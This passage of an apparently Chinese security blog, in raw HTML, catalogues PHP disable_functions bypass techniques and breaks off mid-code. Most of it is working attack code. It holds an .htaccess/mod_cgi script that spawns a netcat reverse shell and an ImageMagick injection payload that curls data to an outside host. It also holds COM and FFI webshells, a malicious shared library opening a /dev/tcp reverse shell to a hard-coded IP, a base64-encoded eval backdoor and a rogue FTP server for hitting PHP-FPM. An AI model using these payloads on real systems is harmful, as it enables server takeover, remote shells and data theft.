class="hljs-variable">$regexp</span> = <span class="hljs-string">&#x27;/File\((.*)\) is not within/&#x27;</span>;<br>        <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$regexp</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$matches</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$matches</span>[<span class="hljs-number">1</span>])) &#123;<br>                <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;%s &lt;br/&gt;&quot;</span>, <span class="hljs-variable">$matches</span>[<span class="hljs-number">1</span>]);<br>        &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="bypass-disable-functions"><a href="#bypass-disable-functions" class="headerlink" title="bypass disable_functions"></a>bypass disable_functions</h3><p>适用于拿到shell禁用了危险函数的情况。</p><p><a href="https://www.anquanke.com/post/id/208451?from=timeline">https://www.anquanke.com/post/id/208451?from=timeline</a></p><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>最新的两种bypass<code>php-concat-bypass</code>与<code>php-filter-bypass</code>。</p><p><a href="https://github.com/mm0r1/exploits">GitHub - mm0r1&#x2F;exploits: Pwn stuff.</a></p><h4 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h4><p>利用mail()等函数开启新进程加载恶意so，已总结不再赘述。</p><h4 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="Apache Mod CGI"></a>Apache Mod CGI</h4><p>本质上是利用·<code>.htaccess</code>，需要满足如下条件：</p><ul><li>目录下有写权限</li><li>apache 使用 apache_mod_php</li><li>Web 目录给了 AllowOverride 权限</li><li>启用了mod_cgi</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs htaccess">#上传.htaccess<br>Options +ExecCGI<br>AddHandler cgi-script .test<br><br>#上传shell.test<br>#!/bin/bash<br>echo&amp;&amp;cat /etc/passwd<br></code></pre></td></tr></table></figure><p>然后访问shell.test即可触发。</p><p>或者若允许上传php脚本可以直接执行php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;nc -c &#x27;/bin/bash&#x27; xxx.xx.xx.xx 4444&quot;</span>; <span class="hljs-comment">//command to be executed</span><br><span class="hljs-variable">$shellfile</span> = <span class="hljs-string">&quot;#!/bin/bashn&quot;</span>; <span class="hljs-comment">//using a shellscript</span><br><span class="hljs-variable">$shellfile</span> .= <span class="hljs-string">&quot;echo -ne &quot;</span>Content-Type: text/html\n\n<span class="hljs-string">&quot;n&quot;</span>; <span class="hljs-comment">//header is needed, otherwise a 500 error is thrown when there is output</span><br><span class="hljs-variable">$shellfile</span> .= <span class="hljs-string">&quot;<span class="hljs-subst">$cmd</span>&quot;</span>; <span class="hljs-comment">//executing $cmd</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkEnabled</span>(<span class="hljs-params"><span class="hljs-variable">$text</span>,<span class="hljs-variable">$condition</span>,<span class="hljs-variable">$yes</span>,<span class="hljs-variable">$no</span></span>) //<span class="hljs-title">this</span> <span class="hljs-title">surely</span> <span class="hljs-title">can</span> <span class="hljs-title">be</span> <span class="hljs-title">shorter</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$text</span>: &quot;</span> . (<span class="hljs-variable">$condition</span> ? <span class="hljs-variable">$yes</span> : <span class="hljs-variable">$no</span>) . <span class="hljs-string">&quot;&lt;br&gt;n&quot;</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;checked&#x27;</span>]))<br>&#123;<br>    @<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;.htaccess&#x27;</span>, <span class="hljs-string">&quot;nSetEnv HTACCESS on&quot;</span>, FILE_APPEND); <span class="hljs-comment">//Append it to a .htaccess file to see whether .htaccess is allowed</span><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: &#x27;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>] . <span class="hljs-string">&#x27;?checked=true&#x27;</span>); <span class="hljs-comment">//execute the script again to see if the htaccess test worked</span><br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-variable">$modcgi</span> = <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-string">&#x27;mod_cgi&#x27;</span>, <span class="hljs-title function_ invoke__">apache_get_modules</span>()); <span class="hljs-comment">// mod_cgi enabled?</span><br>    <span class="hljs-variable">$writable</span> = <span class="hljs-title function_ invoke__">is_writable</span>(<span class="hljs-string">&#x27;.&#x27;</span>); <span class="hljs-comment">//current dir writable?</span><br>    <span class="hljs-variable">$htaccess</span> = !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTACCESS&#x27;</span>]); <span class="hljs-comment">//htaccess enabled?</span><br>        <span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">&quot;Mod-Cgi enabled&quot;</span>,<span class="hljs-variable">$modcgi</span>,<span class="hljs-string">&quot;Yes&quot;</span>,<span class="hljs-string">&quot;No&quot;</span>);<br>        <span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">&quot;Is writable&quot;</span>,<span class="hljs-variable">$writable</span>,<span class="hljs-string">&quot;Yes&quot;</span>,<span class="hljs-string">&quot;No&quot;</span>);<br>        <span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">&quot;htaccess working&quot;</span>,<span class="hljs-variable">$htaccess</span>,<span class="hljs-string">&quot;Yes&quot;</span>,<span class="hljs-string">&quot;No&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$modcgi</span> &amp;&amp; <span class="hljs-variable">$writable</span> &amp;&amp; <span class="hljs-variable">$htaccess</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Error. All of the above must be true for the script to work!&quot;</span>; <span class="hljs-comment">//abort if not</span><br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">&quot;Backing up .htaccess&quot;</span>,<span class="hljs-title function_ invoke__">copy</span>(<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.htaccess.bak&quot;</span>),<span class="hljs-string">&quot;Suceeded! Saved in .htaccess.bak&quot;</span>,<span class="hljs-string">&quot;Failed!&quot;</span>); <span class="hljs-comment">//make a backup, cause you never know.</span><br>        <span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">&quot;Write .htaccess file&quot;</span>,<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;.htaccess&#x27;</span>,<span class="hljs-string">&quot;Options +ExecCGInAddHandler cgi-script .dizzle&quot;</span>),<span class="hljs-string">&quot;Succeeded!&quot;</span>,<span class="hljs-string">&quot;Failed!&quot;</span>); <span class="hljs-comment">//.dizzle is a nice extension</span><br>        <span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">&quot;Write shell file&quot;</span>,<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;shell.dizzle&#x27;</span>,<span class="hljs-variable">$shellfile</span>),<span class="hljs-string">&quot;Succeeded!&quot;</span>,<span class="hljs-string">&quot;Failed!&quot;</span>); <span class="hljs-comment">//write the file</span><br>        <span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">&quot;Chmod 777&quot;</span>,<span class="hljs-title function_ invoke__">chmod</span>(<span class="hljs-string">&quot;shell.dizzle&quot;</span>,<span class="hljs-number">0777</span>),<span class="hljs-string">&quot;Succeeded!&quot;</span>,<span class="hljs-string">&quot;Failed!&quot;</span>); <span class="hljs-comment">//rwx</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Executing the script now. Check your listener &lt;img src = &#x27;shell.dizzle&#x27; style = &#x27;display:none;&#x27;&gt;&quot;</span>; <span class="hljs-comment">//call the script</span><br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="Json-Serializer-UAF"><a href="#Json-Serializer-UAF" class="headerlink" title="Json Serializer UAF"></a>Json Serializer UAF</h4><p>⭐参考： <a href="https://github.com/mm0r1/exploits">GitHub - mm0r1&#x2F;exploits: Pwn stuff.</a></p><p>利用json序列化中的堆溢出触发，借以绕过disable_function，影响范围是</p><ul><li>7.1 – all versions to date</li><li>7.2 &lt; 7.2.19 (released: 30 May 2019)</li><li>7.3 &lt; 7.3.6 (released: 30 May 2019)</li></ul><h4 id="GC-UAF"><a href="#GC-UAF" class="headerlink" title="GC UAF"></a>GC UAF</h4><p>利用的是PHP garbage collector程序中的堆溢出触发，影响范围为7.0-1.3</p><h4 id="Backtrace-UAF"><a href="#Backtrace-UAF" class="headerlink" title="Backtrace UAF"></a>Backtrace UAF</h4><p>影响版本是7.0-7.4</p><h4 id="FFI扩展"><a href="#FFI扩展" class="headerlink" title="FFI扩展"></a>FFI扩展</h4><p>php&gt;7.4，开启了FFI扩展ffi.enable&#x3D;true，我们可以通过FFI来调用C中的system进而达到执行命令的目的</p><p>传入ffi.php。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//ffi.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ffi</span> = FFI::<span class="hljs-title function_ invoke__">cdef</span>(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);<br><span class="hljs-variable">$ffi</span>-&gt;<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;whoami &gt;/tmp/1&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/tmp/1&quot;</span>);<br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;/tmp/1&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h4><p>两种利用方式，第一种是执行外带</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Disable Functions: &quot;</span> . <span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&#x27;disable_functions&#x27;</span>) . <span class="hljs-string">&quot;n&quot;</span>;<br><br><span class="hljs-variable">$command</span> = PHP_SAPI == <span class="hljs-string">&#x27;cli&#x27;</span> ? <span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>] : <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$command</span> == <span class="hljs-string">&#x27;&#x27;</span>) &#123;<br>    <span class="hljs-variable">$command</span> = <span class="hljs-string">&#x27;curl xx.xx.xx.xx:9962/`whoami`&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$exploit</span> = <span class="hljs-string">&lt;&lt;&lt;EOF</span><br><span class="hljs-string">push graphic-context</span><br><span class="hljs-string">viewbox 0 0 640 480</span><br><span class="hljs-string">fill &#x27;url(http://IP:PORT/image.jpg&quot;&#124;<span class="hljs-subst">$command</span>&quot;)&#x27;</span><br><span class="hljs-string">pop graphic-context</span><br><span class="hljs-string">EOF</span>;<br><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;test.mvg&quot;</span>, <span class="hljs-variable">$exploit</span>);<br><span class="hljs-variable">$thumb</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Imagick</span>();<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">readImage</span>(<span class="hljs-string">&#x27;test.mvg&#x27;</span>);<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">writeImage</span>(<span class="hljs-string">&#x27;test.png&#x27;</span>);<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">clear</span>();<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">destroy</span>();<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;test.mvg&quot;</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;test.png&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>监听即可。</p><p>第二种本质上还是LD_PRELOAD，原因在于Imagick()和mail()一样会启用新进程。上传exploit.so(反弹shell)与test.mo，然后执行代码：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">backdoor</span><span class="hljs-operator">=</span>putenv(<span class="hljs-string">&quot;LD_PRELOAD=/tmp/79e3f0b59df431154c088db7e45ebe6b/exploit.so&quot;</span>)<span class="hljs-comment">;$mov = new Imagick(&quot;/tmp/79e3f0b59df431154c088db7e45ebe6b/test.mov&quot;);</span><br></code></pre></td></tr></table></figure><p>开启新进程的过程中就会加载恶意so。</p><h4 id="COM组件"><a href="#COM组件" class="headerlink" title="COM组件"></a>COM组件</h4><p>仅适用于windows，开启com.allow_dcom &#x3D; true，添加extension&#x3D;php_com_dotnet.dll。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//exp.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$command</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$wsh</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">COM</span>(<span class="hljs-string">&#x27;WScript.shell&#x27;</span>); <span class="hljs-comment">// 生成一个COM对象　Shell.Application也能</span><br><span class="hljs-variable">$exec</span> = <span class="hljs-variable">$wsh</span>-&gt;<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;cmd /c&quot;</span>.<span class="hljs-variable">$command</span>); <span class="hljs-comment">//调用对象方法来执行命令</span><br><span class="hljs-variable">$stdout</span> = <span class="hljs-variable">$exec</span>-&gt;<span class="hljs-title function_ invoke__">StdOut</span>();<br><span class="hljs-variable">$stroutput</span> = <span class="hljs-variable">$stdout</span>-&gt;<span class="hljs-title function_ invoke__">ReadAll</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$stroutput</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h4><p>FPM有TCP模式与Unix Socket模式，这里利用TCP模式构造fastcgi协议与fpm通信， 开启PHP_ADMIN_VALUE来加载恶意so。</p><p>此利用方式主要需要解决的问题是</p><ul><li>so的上传，需要目录写权限。</li><li>如何把二进制攻击流量打入fpm，我们知道gopher协议是支持转发二进制流量的，通常我们可以使用gopher+fpm利用curl实现ssrf rce，但是gopher协议受curl支持，不受php支持，要在php转发二进制流量需要借助FTP PASV mode。<ul><li>若目标机器出网，则可以在vps上运行恶意ftp转发流量打fpm。(参考<strong>one pointer php</strong>)</li><li>若目标机器不出网，则只能在机器本地起恶意ftp。(参考<strong>make php great and great again</strong>)</li></ul></li></ul><h5 id="目标出网"><a href="#目标出网" class="headerlink" title="目标出网"></a>目标出网</h5><p>1.编写并上传恶意so</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//恶意so</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br>__attribute__ ((__constructor__)) <span class="hljs-type">void</span> <span class="hljs-title function_">preload</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    system(<span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/101.33.203.2/4444 0&gt;&amp;1&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc evil.c -o evil.so --shared -fPIC<br></code></pre></td></tr></table></figure><p>写一个脚本ftp.php用于上传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>@<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;test&quot;</span>);<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;open_basedir&quot;</span>,<span class="hljs-string">&quot;..&quot;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;..&quot;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;..&quot;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;..&quot;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;..&quot;</span>);<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;open_basedir&quot;</span>,<span class="hljs-string">&quot;/&quot;</span>);<br><span class="hljs-variable">$context</span> = <span class="hljs-title function_ invoke__">stream_context_create</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;ftp&#x27;</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;overwrite&#x27;</span> =&gt; <span class="hljs-literal">true</span>)));<br>@<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>],<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>],<span class="hljs-number">0</span>,<span class="hljs-variable">$context</span>));<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>base64编码并写入ftp.php</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">backdoor=file_put_contents(<span class="hljs-string">&#x27;ftp.php&#x27;</span>,base64_decode(<span class="hljs-string">&#x27;PD9waHAKc2hvd19zb3VyY2UoX19GSUxFX18pOwpAbWtkaXIoJ3Rlc3QnKTsKY2hkaXIoInRlc3QiKTtpbmlfc2V0KCJvcGVuX2Jhc2VkaXIiLCIuLiIpO2NoZGlyKCIuLiIpO2NoZGlyKCIuLiIpO2NoZGlyKCIuLiIpO2NoZGlyKCIuLiIpO2luaV9zZXQoIm9wZW5fYmFzZWRpciIsIi8iKTsKJGNvbnRleHQgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoYXJyYXkoJ2Z0cCcgPT4gYXJyYXkoJ292ZXJ3cml0ZScgPT4gdHJ1ZSkpKTsKQHZhcl9kdW1wKGZpbGVfcHV0X2NvbnRlbnRzKCRfR0VUWyd1cmwnXSwkX1BPU1RbJ3BheWxvYWQnXSwwLCRjb250ZXh0KSk7CkBldmFsKCRfUkVRVUVTVFsnY29kZSddKTsKPz4=&#x27;</span>)); <br><br><span class="hljs-comment">#可以开个远程的ftp尝试一下</span><br><br>POST /ftp.php?url=ftp://aa:passwd@IP/test.txt HTTP/1.1<br>............<br>payload=hello<br><br><span class="hljs-comment">#vps出现test.txt则出网</span><br></code></pre></td></tr></table></figure><p>传恶意so</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br>c = quote(<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;evil.so&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read())<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;payload.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>).write(c)<br><span class="hljs-comment"># POST /ftp.php?url=/var/www/html/evil.so</span><br><span class="hljs-comment"># body里放payload.txt</span><br></code></pre></td></tr></table></figure><p>2.vps运行evil_ftp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#evil_ftp.py</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] listening ...........&quot;</span>)<br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) <br>s.bind((<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">9999</span>))<br>s.listen(<span class="hljs-number">1</span>)<br>conn, addr = s.accept()<br>conn.send(<span class="hljs-string">b&#x27;220 (vsFTPd 3.0.3)\r\n&#x27;</span>)<br><span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">0xff</span>))<br>conn.send(<span class="hljs-string">b&#x27;331 Please specify the password.\r\n&#x27;</span>)<br><span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">0xff</span>))<br>conn.send(<span class="hljs-string">b&#x27;230 Login successful.\r\n&#x27;</span>)<br><span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">0xff</span>))<br>conn.send(<span class="hljs-string">b&#x27;200 Switching to Binary mode.\r\n&#x27;</span>)<br><span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">0xff</span>))<br>conn.send(<span class="hljs-string">b&quot;550 Could not get file size.\r\n&quot;</span>)<br><span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">0xff</span>))<br>conn.send(<span class="hljs-string">b&#x27;000 use PASV then\r\n&#x27;</span>)<br><span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">0xff</span>))<br>conn.send(<span class="hljs-string">b&#x27;227 Entering Passive Mode (127,0,0,1,0,9001).\r\n&#x27;</span>)  <span class="hljs-comment">#转发流量至fpm运行的端口</span><br><span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">0xff</span>))<br>conn.send(<span class="hljs-string">b&#x27;150 Ok to send data.\r\n&#x27;</span>)<br><span class="hljs-comment"># sending payload .....</span><br>conn.send(<span class="hljs-string">b&#x27;226 Transfer complete.\r\n&#x27;</span>)<br><span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">0xff</span>))<br>conn.send(<span class="hljs-string">b&#x27;221 Goodbye.\r\n&#x27;</span>)<br>conn.close()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] completed ~~&quot;</span>)<br></code></pre></td></tr></table></figure><p>3.生成恶意fpm流量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span 